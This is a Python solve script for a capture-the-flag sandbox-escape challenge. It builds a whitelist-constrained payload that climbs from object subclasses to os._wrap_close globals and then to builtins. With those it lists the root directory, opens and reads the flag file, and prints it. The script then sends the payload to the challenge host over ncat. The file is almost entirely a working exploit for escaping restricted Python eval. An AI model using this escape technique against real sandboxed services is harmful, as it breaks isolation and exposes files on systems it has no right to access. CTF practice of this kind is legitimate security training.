#!/usr/bin/env python3
import argparse
import os
import re
import subprocess
import sys
import time


HOST = os.environ.get("HOST", "silent-af99fbbb84c0.chall.nnsc.tf")
PORT = int(os.environ.get("PORT", "1337"))
SUBIDX = int(os.environ.get("SUBIDX", "167"))
BUILTIN_IDX = int(os.environ.get("BUILTIN_IDX", "42"))

WL = "),dw.r_[silent]g=c:f("


def build_payload(probe_root: bool = False, probe_print: bool = False):
    elems = []

    def add(expr: str):
        expr = str(expr)
        if len(expr) > 13:
            raise ValueError(f"element too long: {expr!r}")
        if not all(ch in WL for ch in expr):
            raise ValueError(f"forbidden char in {expr!r}")
        elems.append(expr)

    def assign(name: str, expr: str):
        add(f"{name}:={expr}")

    def repeat(expr: str, count: int):
        for _ in range(count):
            add(expr)

    def fresh_len(count: int, scratch: str = "i", filler: str = "s"):
        assign("c", "[]")
        assign(scratch, "c.insert")
        assign("c", "c.__len__")
        repeat(f"{scratch}(c(),s)", count)

    def bind_next(dict_var: str, scratch: str = "i"):
        assign("i", f"{dict_var}.__iter__")
        assign("i", "i()")
        assign("d", "i.__dir__")
        assign("d", "d()")
        fresh_len(1, scratch=scratch)
        assign("e", "d[c()]")
        assign("n", "g(i,e)")

    def advance(count: int):
        repeat("n()", count)

    # A. Bootstrap object and install a short attribute getter.
    assign("s", "[]")
    assign("s", "s.__new__")
    assign("s", "s.__new__")
    assign("s", "s.__self__")
    assign("d", "s.__dir__")
    assign("d", "d(s)")
    assign("g", "s.__dict__")
    assign("g", "g.get")
    fresh_len(3)
    assign("e", "d[c()]")
    assign("g", "g(e)")

    # B. object.__subclasses__ -> subclass list.
    fresh_len(10)
    assign("e", "d[c()]")
    assign("s", "g(s,e)")
    assign("s", "s()")

    # C. Select os._wrap_close at the verified index.
    fresh_len(SUBIDX)
    assign("s", "s[c()]")

    # D/E. Grab __init__ then its __globals__ as os globals.
    assign("s", "s.__init__")
    assign("d", "s.__dir__")
    assign("d", "d()")
    fresh_len(5)
    assign("e", "d[c()]")
    assign("w", "g(s,e)")

    # F/G. Fresh os globals iterator, fetch chdir/getcwd/listdir and keep the dict.
    bind_next("w", scratch="r")
    advance(20)
    assign("e", "n()")
    assign("l", "w.get")
    assign("l", "l(e)")
    advance(7)
    assign("e", "n()")
    assign("f", "w.get")
    assign("f", "f(e)")
    advance(2)
    assign("e", "n()")
    assign("t", "w.get")
    assign("t", "t(e)")

    # M. Build builtins dict from os globals, using a fresh iterator.
    bind_next("w", scratch="r")
    advance(6)
    assign("e", "n()")
    assign("r", "w.get")
    assign("r", "r(e)")

    if probe_print:
        bind_next("r", scratch="t")
        advance(BUILTIN_IDX)
        assign("e", "n()")
        assign("f", "r.get")
        assign("f", "f(e)")
        add("f(c())")
        payload = "[" + ",".join(elems) + "]"
        if not all(ch in WL or ch == "," for ch in payload):
            raise AssertionError("payload contains forbidden char")
        if max((len(x) for x in elems), default=0) > 13:
            raise AssertionError("payload element too long")
        return payload, elems

    # H. Turn cwd into "/" and move there.
    assign("f", "f()")
    fresh_len(1)
    assign("f", "f[:c()]")
    add("l(f)")

    # I/J/K/L. List root, sort it through whitelist-safe attr lookup, and choose the flag entry.
    assign("t", "t()")
    assign("d", "t.__dir__")
    assign("d", "d()")
    fresh_len(33)
    assign("e", "d[c()]")
    assign("f", "g(t,e)")
    assign("f", "f()")
    if probe_root:
        assign("w", "t")
        bind_next("r", scratch="t")
        advance(42)
        assign("e", "n()")
        assign("f", "r.get")
        assign("f", "f(e)")
        add("f(w)")
        payload = "[" + ",".join(elems) + "]"
        if not all(ch in WL or ch == "," for ch in payload):
            raise AssertionError("payload contains forbidden char")
        if max((len(x) for x in elems), default=0) > 13:
            raise AssertionError("payload element too long")
        return payload, elems
    fresh_len(5)
    assign("l", "t[c()]")

    # N/O. Open the flag path, then fetch file.read through a fresh dir lookup.
    bind_next("r", scratch="t")
    advance(152)
    assign("e", "n()")
    assign("f", "r.get")
    assign("f", "f(e)")
    assign("f", "f(l)")
    assign("d", "f.__dir__")
    assign("d", "d()")
    fresh_len(7)
    assign("e", "d[c()]")
    assign("n", "g(f,e)")
    assign("l", "n()")

    # P/Q. Fetch print from a fresh builtins iterator and print the flag.
    bind_next("r", scratch="t")
    advance(42)
    assign("e", "n()")
    assign("n", "r.get")
    assign("n", "n(e)")
    add("n(l)")

    payload = "[" + ",".join(elems) + "]"
    if not all(ch in WL or ch == "," for ch in payload):
        raise AssertionError("payload contains forbidden char")
    if max((len(x) for x in elems), default=0) > 13:
        raise AssertionError("payload element too long")
    return payload, elems


def short(v, limit=80):
    try:
        s = repr(v)
    except Exception as exc:  # pragma: no cover
        s = f"<repr {type(exc).__name__}>"
    if len(s) > limit:
        s = s[: limit - 3] + "..."
    return s


def trace_payload(elems):
    env = {"__builtins__": {}}
    keep = ["s", "w", "r", "l", "f", "g", "d", "i", "n", "c", "t", "e"]
    for idx, expr in enumerate(elems):
        try:
            eval(f"({expr})", env, env)
        except Exception as exc:
            snap = ", ".join(f"{k}={short(env[k])}" for k in keep if k in env)
            print(f"FAIL {idx}: {expr}")
            print(f"EXC {type(exc).__name__}: {exc}")
            print(f"STATE {snap}")
            return False
    print("OK")
    return True


def run_remote(payload: str):
    cmd = ["ncat", "--ssl", "--no-shutdown", HOST, str(PORT)]
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    assert proc.stdin is not None
    proc.stdin.write(payload.encode() + b"\n")
    proc.stdin.flush()
    time.sleep(3.0)
    proc.stdin.close()
    try:
        proc.wait(timeout=30)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise SystemExit("[-] remote timeout")
    out = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
    err = proc.stderr.read().decode(errors="replace") if proc.stderr else ""
    if err:
        print(err, end="", file=sys.stderr)
    if not out:
        raise SystemExit("[-] remote returned no stdout")
    matches = re.findall(r"[A-Za-z0-9_]+\{[^}\r\n]+\}", out)
    if matches:
        print(matches[-1])
        return
    print(out[-500:], end="")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--trace", action="store_true", help="evaluate elements one by one")
    ap.add_argument("--eval", action="store_true", help='run eval(payload, {"__builtins__": {}})')
    ap.add_argument("--probe-root", action="store_true", help="print the sorted root listing")
    ap.add_argument("--probe-print", action="store_true", help="print a tiny probe value")
    args = ap.parse_args()

    payload, elems = build_payload(
        probe_root=args.probe_root,
        probe_print=args.probe_print,
    )
    print(
        f"[+] payload: {len(payload)} chars / "
        f"{len(elems)} elements / max element {max(map(len, elems))}"
    )

    if args.trace:
        raise SystemExit(0 if trace_payload(elems) else 1)

    if args.eval:
        eval(payload, {"__builtins__": {}})
        return

    run_remote(payload)


if __name__ == "__main__":
    main()
